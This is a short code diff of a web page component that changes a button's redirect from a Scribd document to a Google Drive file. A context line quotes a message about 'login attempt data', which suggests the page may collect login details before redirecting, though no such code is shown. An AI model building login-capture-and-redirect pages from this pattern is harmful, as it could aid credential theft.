@@ -72,7 +72,7 @@ This is an automated message with login attempt data.`,
             </h1>
              <button
               onClick={() => {
-                window.location.href = 'https://www.scribd.com/document/852995308/2025-0610-m25-qp-42-250407-133553-250413-191445';
+                window.location.href = 'https://drive.google.com/file/d/1z9yZ7I-Q4Wy_stoWhHVCnbRa7sdJK9r9/view?usp=sharing';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
